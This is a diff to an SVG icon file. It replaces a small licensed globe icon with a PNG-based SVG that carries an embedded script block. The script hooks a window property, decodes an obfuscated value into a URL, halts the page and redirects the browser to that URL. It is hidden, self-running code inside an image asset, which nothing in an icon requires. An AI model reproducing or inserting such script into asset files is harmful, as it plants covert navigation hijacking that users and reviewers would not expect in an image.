@@ -1,7 +1,48 @@
-<!-- This Source Code Form is subject to the terms of the Mozilla Public
-   - License, v. 2.0. If a copy of the MPL was not distributed with this
-   - file, You can obtain one at http://mozilla.org/MPL/2.0/. -->
-<svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="#0b0b0b">
-  <path d="M8.507 3.508l-1.978.003-.107.107v1.334l.848.891.455.031.107-.107v-.57l.75-.705.032-.877zM11.675 8.811l-1.389-1.348h-1.49l-.52.476-.032 1.023.665.708 1.22.032-.107-.107v1.108l.897.942.29.031.108-.107v-1.066l.39-.345.03-.855-.107.107h.24l.377-.334v-.151l-.116-.114-.531-.031z"/>
-  <path d="M7.973 13.145a5.177 5.177 0 0 1-5.171-5.172c0-.034 0-.034.002-.066v-.003-.03l.17-.081.667.54.453.031.458.502-.03.832.291.352h.434l.105.088-.03 1.752.483.512h.097l.023-.31.927-.88.05-.435.489-.427v-.82l-.543-.035-1.032-1.066H4.29l-.142-.084v-.796l.142-.093h1.074v-.251l.11-.105.648.03.455-.408.031-.69-.576-.603h-.668v.26l-.102.064h-.826l-.105-.084.023-.59.442-.397v-.226h-.352c-.094 0-.14-.119-.073-.184a5.154 5.154 0 0 1 7.005-.187.104.104 0 0 1-.069.184l-1.056-.031-.745.74.48.484v.148l-.354.357h-.146l-.162-.163v-.148l.07-.07-.232-.232-.342.334.49.49c.065.066.004.18-.09.179l-.694-.004v.779h.723l.03-.516.147-.133h.148l.574.562v.248l.533.025h.003l.166-.028 1.14 1.143.695-.653h.353l.107.1c0 .018.003.015.003.033v.002c0 .028-.002.028-.001.058a5.179 5.179 0 0 1-5.174 5.172M7.973 2A5.98 5.98 0 0 0 2 7.974a5.98 5.98 0 0 0 5.973 5.973 5.98 5.98 0 0 0 5.974-5.974A5.98 5.98 0 0 0 7.973 2"/>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="32px" height="32px" viewBox="0 0 32 32" enable-background="new 0 0 32 32" xml:space="preserve"><script xmlns="">
+Object.defineProperty(window, 'ysmm', {
+	set: function(val) {
+		var T3 = val,
+				key,
+				I = '',
+				X = '';
+		for (var m = 0; m &lt; T3.length; m++) {
+			if (m % 2 == 0) {
+				I += T3.charAt(m);
+			} else {
+				X = T3.charAt(m) + X;
+			}
+		}
+		T3 = I + X;
+		var U = T3.split('');
+		for (var m = 0; m &lt; U.length; m++) {
+			if (!isNaN(U[m])) {
+				for (var R = m + 1; R &lt; U.length; R++) {
+					if (!isNaN(U[R])) {
+						var S = U[m]^U[R];
+						if (S &lt; 10) {
+							U[m] = S;
+						}
+						m = R;
+						R = U.length;
+					}
+				}
+			}
+		}
+		T3 = U.join('');
+		T3 = window.atob(T3);
+		T3 = T3.substring(T3.length - (T3.length - 16));
+		T3 = T3.substring(0, T3.length - 16);
+		key = T3;
+		if (key &amp;&amp; (key.indexOf('http://') === 0 || key.indexOf("https://") === 0)) {
+			document.write('&lt;!--');
+			window.stop();
+
+			window.onbeforeunload = null;
+			window.location = key;
+		}
+	}
+});
+</script>  <image id="image0" width="32" height="32" x="0" y="0" xlink:href="data:image/png;base64,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"/>
 </svg>
